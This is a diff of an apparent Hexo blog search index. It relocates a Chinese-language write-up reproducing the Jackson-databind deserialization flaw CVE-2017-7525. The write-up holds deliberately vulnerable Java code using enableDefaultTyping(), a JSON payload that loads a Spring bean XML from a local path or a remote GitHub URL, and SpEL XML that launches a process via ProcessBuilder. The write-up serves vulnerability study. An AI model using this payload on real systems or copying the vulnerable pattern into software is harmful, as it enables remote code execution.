@@ -3,92 +3,6 @@
   
     
     <entry>
-      <title><![CDATA[jackson反序列化漏洞_1]]></title>
-      <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E_1/</url>
-      <content type="html"><![CDATA[<h1 id="jackson反序列化漏洞-1"><a href="#jackson反序列化漏洞-1" class="headerlink" title="jackson反序列化漏洞_1"></a>jackson反序列化漏洞_1</h1><p>[TOC]</p>
-<h2 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Jackson enableDefaultTyping 方法反序列化代码执行漏洞</p>
-<p>《漏洞通告】Jackson-databind远程命令执行漏洞通告（CVE-2017-7525）》[1]指出，Jackson是一个开源的java序列化与反序列化工具，可以将java对象序列化为xml和json格式的字符串或将两种文件反序列化为相应的对象。</p>
-<p>Jackson-databind存在远程命令执行漏洞，因Jackson反序列化漏洞（CVE-2017-7525）采用黑名单的方法修复程序，CVE-2017-17485在开启enableDefaultTyping()的前提下可以通过Jackson-databind来滥用Spring spel来执行任意命令。</p>
-<h4 id="jackson-datablind"><a href="#jackson-datablind" class="headerlink" title="jackson-datablind"></a>jackson-datablind</h4><p>jackson本身提供的jackson-core的api调用起来会比较麻烦，jackson-datablind通过依赖core和annotations使jackson调用起来更简单</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>根据触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞<br>【1】Jackson 2.7版本（&lt;2.7.10）、2.8版本（&lt;2.8.9）<br>【2】调用了enableDefaultTyping方法<br>【3】反序列化的类可控</p>
-<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p>【java】代码</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> jackson<span class="token punctuation">.</span>rce<span class="token punctuation">;</span>
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span>
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span>
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
-<span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> 
-<span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException 
-    <span class="token punctuation">{</span>
-        ObjectMapper om <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        om<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> json <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        inner i <span class="token operator">=</span> om<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> inner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">class</span> <span class="token class-name">inner</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>
-    <span class="token keyword">public</span> Object obj<span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>通过传参得方式读入反序列化的类<br>【json】代码<br>本地读取xml</p>
-<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token property">"obj"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span><span class="token punctuation">,</span> <span class="token string">"//Users/daiq/knownsec/工作/互联网/学习/java/RCE/jackson/cve_2017_2725/jackson-rce-via-spel/spel.xml"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
-</code></pre>
-<p>也可以远程读取，改成<code>http</code>协议就行</p>
-<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token property">"obj"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span><span class="token punctuation">,</span> <span class="token string">"https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
-</code></pre>
-<p>【xml】代码</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
-  <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
-  <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>
-     http://www.springframework.org/schema/beans
-     http://www.springframework.org/schema/beans/spring-beans.xsd
-<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/System/Applications/Calculator.app<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>whatever<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#{ pb.start() }<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span>
-</code></pre>
-<h4 id="调用结果"><a href="#调用结果" class="headerlink" title="调用结果"></a>调用结果</h4><p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752623110024.jpg" alt="-w1127"></p>
-<h3 id="漏洞复现说明"><a href="#漏洞复现说明" class="headerlink" title="漏洞复现说明"></a>漏洞复现说明</h3><p>根据该漏洞调试情况，表面上问题主要出在readvalue传入的参数可控，在该案例中，通过读取json文件中的需要转换为inner类的json数据，该json数据中调用<code>FileSystemXmlApplicationContext</code>读入xml中的bean数据，在该方法的调用中实现命令执行</p>
-<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>【1】通过<code>FileSystemXmlApplicationContext</code>读取绝对路径时，得写上两个<code>\</code></p>
-<h3 id="漏洞跟踪"><a href="#漏洞跟踪" class="headerlink" title="漏洞跟踪"></a>漏洞跟踪</h3><p>【1】readvalue函数需要参数 byte[],转换的类对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752631863029.jpg" alt="-w998"><br>【2】从接收的json字节流中创建解析对象<br><code>jsonfactory.creatParse</code>其中<code>src</code>为传入的字节流数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752636355629.jpg" alt="-w1121"><br>传入要转换的java对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752648786936.jpg" alt="-w951"></p>
-<p>【3】通过2构造readMapAndClose传入数据来调用解析json数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650611056.jpg" alt="-w1190"><br>传入的p0数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650176156.jpg" alt="-w1064"></p>
-<p>【4】反序列化json数据流<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752651998120.jpg" alt="-w1224"></p>
-<p>…<br>…<br>object对象读入<br><code>deserializeFromString</code>-&gt;<code>createFromString</code>-&gt;<code>newInstance</code>-&gt;<br><code>loadBeanDefinitions</code>-&gt;<code>FileSystemXmlApplicationContext</code>-&gt;<code>refresh</code><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752667685983.jpg" alt="-w980"></p>
-<p><code>createFromString</code> ：读取json对象，读入xml文件内容<br><code>newInstance</code> ：调用<code>Class.forName</code>加载类 并实例化 即加载<br><code>org.springframework.context.support.FileSystemXmlApplicationContext</code> 实例处理xml文件中的内容</p>
-<p><code>FileSystemResource</code> 读取xml内容<br><code>loadBeanDefinitions</code>:读取xml内容字节流，输入字节流处理<br><code>refresh</code>函数进行xml初始化实例<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752816212912.jpg" alt="-w1040"></p>
-<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752813499215.jpg" alt="-w523"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752830381227.jpg" alt="-w895"></p>
-<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752832744311.jpg" alt="-w1018"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752835566747.jpg" alt="-w1035"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chenergy1991.github.io/2019/03/24/CVE-2017-7275/" target="_blank" rel="noopener">CVE-2017-7275：Jackson-databind漏洞复现与分析笔记</a><br><a href="https://blog.csdn.net/u011499747/article/details/78762007" target="_blank" rel="noopener">Jackson之jackson-databind</a><br><a href="https://www.cnblogs.com/EasonJim/p/8449968.html" target="_blank" rel="noopener">Jackson工具类使用及配置指南、高性能配置（转）</a><br><a href="https://www.jianshu.com/p/de206c18ce08" target="_blank" rel="noopener">Java中newInstance()和new()</a></p>
-]]></content>
-      
-        <categories>
-            
-            <category> web 渗透 </category>
-            
-            <category> java反序列化 </category>
-            
-            <category> jackson </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> web 渗透 </tag>
-            
-            <tag> java反序列化 </tag>
-            
-            <tag> jackson </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[java反弹shell]]></title>
       <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BC%B9shell/</url>
       <content type="html"><![CDATA[<h1 id="java-反弹shell"><a href="#java-反弹shell" class="headerlink" title="java 反弹shell"></a>java 反弹shell</h1><p>[TOC]</p>
@@ -231,6 +145,92 @@ exec 8>&-
             <tag> java反序列化 </tag>
             
             <tag> java反弹shell </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[jackson反序列化漏洞_1]]></title>
+      <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E_1/</url>
+      <content type="html"><![CDATA[<h1 id="jackson反序列化漏洞-1"><a href="#jackson反序列化漏洞-1" class="headerlink" title="jackson反序列化漏洞_1"></a>jackson反序列化漏洞_1</h1><p>[TOC]</p>
+<h2 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Jackson enableDefaultTyping 方法反序列化代码执行漏洞</p>
+<p>《漏洞通告】Jackson-databind远程命令执行漏洞通告（CVE-2017-7525）》[1]指出，Jackson是一个开源的java序列化与反序列化工具，可以将java对象序列化为xml和json格式的字符串或将两种文件反序列化为相应的对象。</p>
+<p>Jackson-databind存在远程命令执行漏洞，因Jackson反序列化漏洞（CVE-2017-7525）采用黑名单的方法修复程序，CVE-2017-17485在开启enableDefaultTyping()的前提下可以通过Jackson-databind来滥用Spring spel来执行任意命令。</p>
+<h4 id="jackson-datablind"><a href="#jackson-datablind" class="headerlink" title="jackson-datablind"></a>jackson-datablind</h4><p>jackson本身提供的jackson-core的api调用起来会比较麻烦，jackson-datablind通过依赖core和annotations使jackson调用起来更简单</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>根据触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞<br>【1】Jackson 2.7版本（&lt;2.7.10）、2.8版本（&lt;2.8.9）<br>【2】调用了enableDefaultTyping方法<br>【3】反序列化的类可控</p>
+<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p>【java】代码</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> jackson<span class="token punctuation">.</span>rce<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> 
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException 
+    <span class="token punctuation">{</span>
+        ObjectMapper om <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        om<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> json <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        inner i <span class="token operator">=</span> om<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> inner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">inner</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> Object obj<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>通过传参得方式读入反序列化的类<br>【json】代码<br>本地读取xml</p>
+<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token property">"obj"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span><span class="token punctuation">,</span> <span class="token string">"//Users/daiq/knownsec/工作/互联网/学习/java/RCE/jackson/cve_2017_2725/jackson-rce-via-spel/spel.xml"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+</code></pre>
+<p>也可以远程读取，改成<code>http</code>协议就行</p>
+<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token property">"obj"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span><span class="token punctuation">,</span> <span class="token string">"https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+</code></pre>
+<p>【xml】代码</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
+  <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
+  <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>
+     http://www.springframework.org/schema/beans
+     http://www.springframework.org/schema/beans/spring-beans.xsd
+<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/System/Applications/Calculator.app<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>whatever<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#{ pb.start() }<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span>
+</code></pre>
+<h4 id="调用结果"><a href="#调用结果" class="headerlink" title="调用结果"></a>调用结果</h4><p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752623110024.jpg" alt="-w1127"></p>
+<h3 id="漏洞复现说明"><a href="#漏洞复现说明" class="headerlink" title="漏洞复现说明"></a>漏洞复现说明</h3><p>根据该漏洞调试情况，表面上问题主要出在readvalue传入的参数可控，在该案例中，通过读取json文件中的需要转换为inner类的json数据，该json数据中调用<code>FileSystemXmlApplicationContext</code>读入xml中的bean数据，在该方法的调用中实现命令执行</p>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>【1】通过<code>FileSystemXmlApplicationContext</code>读取绝对路径时，得写上两个<code>\</code></p>
+<h3 id="漏洞跟踪"><a href="#漏洞跟踪" class="headerlink" title="漏洞跟踪"></a>漏洞跟踪</h3><p>【1】readvalue函数需要参数 byte[],转换的类对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752631863029.jpg" alt="-w998"><br>【2】从接收的json字节流中创建解析对象<br><code>jsonfactory.creatParse</code>其中<code>src</code>为传入的字节流数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752636355629.jpg" alt="-w1121"><br>传入要转换的java对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752648786936.jpg" alt="-w951"></p>
+<p>【3】通过2构造readMapAndClose传入数据来调用解析json数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650611056.jpg" alt="-w1190"><br>传入的p0数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650176156.jpg" alt="-w1064"></p>
+<p>【4】反序列化json数据流<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752651998120.jpg" alt="-w1224"></p>
+<p>…<br>…<br>object对象读入<br><code>deserializeFromString</code>-&gt;<code>createFromString</code>-&gt;<code>newInstance</code>-&gt;<br><code>loadBeanDefinitions</code>-&gt;<code>FileSystemXmlApplicationContext</code>-&gt;<code>refresh</code><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752667685983.jpg" alt="-w980"></p>
+<p><code>createFromString</code> ：读取json对象，读入xml文件内容<br><code>newInstance</code> ：调用<code>Class.forName</code>加载类 并实例化 即加载<br><code>org.springframework.context.support.FileSystemXmlApplicationContext</code> 实例处理xml文件中的内容</p>
+<p><code>FileSystemResource</code> 读取xml内容<br><code>loadBeanDefinitions</code>:读取xml内容字节流，输入字节流处理<br><code>refresh</code>函数进行xml初始化实例<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752816212912.jpg" alt="-w1040"></p>
+<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752813499215.jpg" alt="-w523"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752830381227.jpg" alt="-w895"></p>
+<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752832744311.jpg" alt="-w1018"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752835566747.jpg" alt="-w1035"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chenergy1991.github.io/2019/03/24/CVE-2017-7275/" target="_blank" rel="noopener">CVE-2017-7275：Jackson-databind漏洞复现与分析笔记</a><br><a href="https://blog.csdn.net/u011499747/article/details/78762007" target="_blank" rel="noopener">Jackson之jackson-databind</a><br><a href="https://www.cnblogs.com/EasonJim/p/8449968.html" target="_blank" rel="noopener">Jackson工具类使用及配置指南、高性能配置（转）</a><br><a href="https://www.jianshu.com/p/de206c18ce08" target="_blank" rel="noopener">Java中newInstance()和new()</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> web 渗透 </category>
+            
+            <category> java反序列化 </category>
+            
+            <category> jackson </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> web 渗透 </tag>
+            
+            <tag> java反序列化 </tag>
+            
+            <tag> jackson </tag>
             
         </tags>
         
@@ -1521,9 +1521,9 @@ Content-Type代表发送端（客户端|服务器）发送的实体数据的数�
             
             <tag> Web渗透 </tag>
             
-            <tag> XXE </tag>
-            
             <tag> 漏洞学习 </tag>
+            
+            <tag> XXE </tag>
             
         </tags>
         
